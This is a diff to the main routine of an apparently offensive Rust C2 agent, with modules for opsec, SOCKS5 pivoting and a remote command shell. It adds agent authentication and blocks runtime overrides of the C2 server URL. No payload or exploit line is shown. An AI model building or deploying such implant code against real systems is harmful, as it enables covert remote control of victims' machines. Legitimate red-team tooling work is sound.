@@ -12,6 +12,7 @@ use agent::opsec;
 use agent::state;
 
 // Specific imports from the library
+use agent::auth::AgentAuth;
 use agent::commands::command_shell::agent_loop;
 use agent::config::AgentConfig;
 use agent::networking::socks5_pivot::Socks5PivotHandler;
@@ -103,11 +104,20 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     });
 
-    let server_addr = env::args()
-        .nth(1)
-        .unwrap_or_else(|| config.get_server_url());
+    if env::args_os().nth(1).is_some() {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            "runtime C2 URL overrides are disabled; rebuild the payload for a different listener",
+        )
+        .into());
+    }
+    let server_addr = config
+        .get_validated_server_url()
+        .map_err(|err| std::io::Error::new(std::io::ErrorKind::InvalidInput, err))?
+        .to_string();
 
     let agent_id = agent::identity::resolve_runtime_agent_id(&config)?;
+    let auth = Arc::new(AgentAuth::for_runtime(&config, &agent_id)?);
     info!("[INFO] Payload ID: {}", config.payload_id);
     info!("[INFO] Agent ID: {}", agent_id);
 
@@ -128,6 +138,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     &config,
                     &server_addr,
                     &agent_id,
+                    &auth,
                 )
                 .await
                 {
@@ -152,6 +163,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         if let Err(e) = agent::commands::command_shell::agent_loop(
             &server_addr,
             &agent_id,
+            auth.clone(),
             pivot_handler.clone(),
             pivot_tx.clone(),
         )
@@ -181,6 +193,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         &config,
                         &server_addr,
                         &agent_id,
+                        &auth,
                     )
                     .await
                     {
